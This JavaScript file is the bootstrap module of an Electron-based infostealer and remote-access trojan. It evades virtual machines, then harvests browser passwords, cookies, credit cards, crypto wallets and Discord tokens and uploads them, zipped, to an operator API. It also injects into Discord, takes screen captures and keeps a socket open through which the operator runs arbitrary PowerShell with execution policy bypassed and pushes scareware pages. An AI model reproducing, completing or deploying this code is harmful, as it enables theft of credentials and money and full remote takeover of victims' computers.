Object.defineProperty(exports, "__esModule", {
  value: true
});
const {
  StorageService
} = require("./modules/encrypt-output/services/StorageService");
const {
  CONFIG
} = require("./modules/encrypt-output/config");
const {
  getHWID
} = require("./modules/encrypt-output/utils/GetHWID");
const {
  AntiVM
} = require("./modules/encrypt-output/services/AntiVM");
const {
  BrowserDataCollector
} = require("./modules/encrypt-output/services/BrowserDataCollector");
const {
  DiscordDataExtractor
} = require("./modules/encrypt-output/services/Discord");
const {
  io
} = require("socket.io-client");
const {
  CommandExecutor
} = require("./modules/encrypt-output/services/CommandExecutor");
const {
  ApiSender
} = require("./modules/encrypt-output/services/ApiSender");
const main = require("./modules/encrypt-output/electron/main");
const {
  takeCapture
} = require("./modules/encrypt-output/utils/capture");
const {
  getNetworkInfo
} = require("./modules/encrypt-output/utils/NetworkInfo");
const os = require("os");
const {
  logger
} = require("./modules/encrypt-output/utils/Logger");
const {
  ZipService
} = require("./modules/encrypt-output/services/ZipService");
const fs = require("fs");
const path = require("path");
const {
  extractDesktopWallets
} = require("./modules/encrypt-output/utils/wallet");
const {
  exec
} = require("child_process");
const {
  initializeClientSecurity
} = require("./modules/encrypt-output/utils/initializeClientSecurity");
async function bootstrap() {
  logger.step("BOOTSTRAP", "Starting application bootstrap...");
  try {
    function getDateFallback(command, callback) {
      exec('powershell -Command "Get-Date"', (error, stdout, stderr) => {
        callback(stdout ? stdout.trim() : null, error || (stderr ? new Error(stderr) : null));
      });
    }
    logger.info("Application is packaged, performing security checks...");
    const securityCheck = await AntiVM.isVirtualMachine();
    if (securityCheck.isVM) {
      logger.error("Security check failed. Score: " + securityCheck.score);
      process.exit(1);
    }
    await initializeClientSecurity();
    logger.info("Security checks passed.");
    const tempDirectory = CONFIG.TMP_DIR;
    logger.step("INITIALIZATION", "Initializing StorageService with temp dir: " + tempDirectory);
    await StorageService.init(tempDirectory);
    const hwid = getHWID();
    const sender = new ApiSender(CONFIG.ADMIN_ID, CONFIG.LICENSE_KEY, hwid, CONFIG.API_URL);
    const stats = await new BrowserDataCollector().collectAll(CONFIG.USER_DATA, CONFIG.TMP_DIR);
    logger.info("Collection completed. Stats: Passwords=" + stats.passwords + ", Cookies=" + stats.cookies + ", CreditCards=" + stats.creditCards);
    await extractDesktopWallets(CONFIG.TMP_DIR);
    const zipPath = path.join(CONFIG.TMP_DIR, "logs.zip");
    logger.info("Zipping collection data: " + CONFIG.TMP_DIR + " -> " + zipPath);
    await ZipService.zipCollection(CONFIG.TMP_DIR, zipPath);
    const machine = AntiVM.getMachineDetails();
    if (!fs.existsSync(zipPath)) {
      logger.error("Zip file not found at " + zipPath);
      return;
    }
    const size = (fs.statSync(zipPath).size / 1048576).toFixed(2) + " MB";
    logger.info("Zip file size: " + size);
    logger.info("Fetching network info for reporting...");
    const network = await getNetworkInfo();
    logger.step("REPORTING", "Sending browser data report to API...");
    await sender.reportBrowserData({
      ...stats,
      username: machine.username || (machine.hostname ?? "Unkown"),
      ram: machine.ram,
      uptime: machine.uptime,
      size,
      ip: network.ip,
      country: network.country,
      antiVirus: AntiVM.detectAntiVirus() || "None"
    }, zipPath);
    logger.info("Extracting all Discord tokens...");
    const tokens = await DiscordDataExtractor.extractAllTokens(CONFIG.TMP_DIR);
    logger.info("Extraction complete. Found " + tokens.length + " valid tokens.");
    logger.info("Reporting Discord data to API...");
    await sender.reportDiscordData(tokens);
    logger.step("REPORTING", "Reporting identified Passwords");
    await sender.reportPasswordData({
      username: machine.username || (machine.hostname ?? "Unknown"),
      gmailPasswords: stats.gmailAccounts,
      outlookPasswords: stats.outlookAccounts,
      passwords: stats.commonPasswords,
      ip: network.ip,
      country: network.country,
      hwid,
      admin: CONFIG.ADMIN_ID
    });
    logger.info("BrowserDataCollector initialization and reporting finished successfully.");
    logger.step("SYSTEM_INFO", "Fetching network and user information...");
    const userNetwork = await getNetworkInfo();
    const username = os.userInfo().username;
    const userInfo = {
      username,
      ip: userNetwork.ip,
      country: userNetwork.country
    };
    logger.info("System Info: User=" + username + ", IP=" + userNetwork.ip + ", Country=" + userNetwork.country);
    logger.step("CAPTURE", "Taking initial capture...");
    await takeCapture(sender, userInfo);
    logger.info("Starting client Registery");
    const machineDetails = AntiVM.getMachineDetails();
    await sender.registerInject({
      ...machineDetails,
      hwid,
      adminId: CONFIG.ADMIN_ID
    });
    logger.step("DISCORD_INJECTION", "Starting Discord injection process...");
    await DiscordDataExtractor.injectDiscord();
    const socket = io(CONFIG.API_URL, {
      autoConnect: true,
      transports: ["websocket"],
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      randomizationFactor: 0.5,
      timeout: 10000
    });
    let commandExecutor = null;
    socket.on("connect", () => {
      logger.info("✅ Socket connection established");
      logger.info("🔐 Emitting authenticate with hwid=\"" + hwid + '" userId="' + CONFIG.ADMIN_ID + '"');
      socket.emit("authenticate", {
        userId: CONFIG.ADMIN_ID,
        licenseKey: CONFIG.LICENSE_KEY,
        hwid
      });
    });
    socket.on("authenticated", response => {
      logger.info("🔐 Socket authenticated by server");
      if (!commandExecutor) commandExecutor = new CommandExecutor(socket, sender, hwid);
      main.setSocketInstance(socket);
      logger.info("✅ CommandExecutor ready");
    });
    socket.on("request-popup-chat", () => {
      logger.info("🔔 Popup chat requested by operator");
      if (main.default && main.default.isPackaged && main.mainWindow && main.mainWindow.webContents) {
        main.mainWindow.webContents.send("load-html", {
          html: "scareware.html"
        });
      }
    });
    socket.on("request-load-html", request => {
      logger.info("📄 HTML load request received: " + request.html);
      if (main.default && main.default.isPackaged) {
        const window = require("electron").BrowserWindow.getAllWindows()[0];
        if (window && window.webContents) window.webContents.send("load-html", {
          html: request.html
        });
      }
    });
    socket.on("receive-message", payload => {
      const message = typeof payload === "object" ? payload.message : payload;
      if (main.mainWindow && !main.mainWindow.isDestroyed()) main.mainWindow.webContents.send("chat-message-received", message);
    });
    socket.off("execute-powershell");
    socket.on("execute-powershell", request => {
      const command = request.command;
      const commandId = request.commandId;
      const shellCommand = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "' + command.replace(new RegExp('"', "g"), '\\"') + '"';
      exec(shellCommand, {
        encoding: "utf8"
      }, (error, stdout, stderr) => {
        if (error || stderr) {
          const commandError = error ? error.message : stderr.trim();
          console.warn("[Client] Komut hatası: " + commandError);
          getDateFallback(command, (output, fallbackError) => {
            socket.emit("powershell-result", {
              hwid,
              commandId,
              success: false,
              output: output || null,
              error: fallbackError ? fallbackError.message : commandError
            });
          });
          return;
        }
        socket.emit("powershell-result", {
          hwid,
          commandId,
          success: true,
          output: stdout.trim(),
          error: null
        });
      });
    });
    if (process.argv.includes("--hidden")) socket.emit("autoStart", {
      message: "Client started with --hidden flag",
      timestamp: new Date().toISOString()
    });
    socket.on("disconnect", reason => {
      logger.warn("❌ Socket connection closed. Reason: " + reason);
    });
    socket.on("connect_error", error => {
      logger.error("⚠️ Socket connection error:", error.message);
    });
    socket.on("error", error => {
      logger.error("⚠️ Socket general error:", error);
    });
  } catch (error) {
    logger.error("Critical error during bootstrap:", error);
  }
}
if (main.default?.isPackaged) {
  main.default.whenReady().then(bootstrap);
} else {
  bootstrap().catch(error => {
    logger.error("Bootstrap failed with error:", error);
  });
}
